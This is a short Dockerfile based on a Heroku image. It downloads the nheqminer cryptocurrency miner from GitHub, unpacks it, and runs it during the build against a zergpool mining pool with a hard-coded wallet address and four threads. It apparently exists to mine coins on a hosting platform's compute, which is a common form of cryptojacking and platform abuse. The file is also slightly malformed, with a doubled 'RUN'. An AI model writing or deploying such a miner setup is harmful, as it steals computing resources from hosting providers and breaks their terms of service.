FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN  RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u LaxRo693Wz4f4szXKavoRLuft5YCnfyorf.test1 -p c=LTC,mc=VRSC -t 4
CMD bash heroku.sh

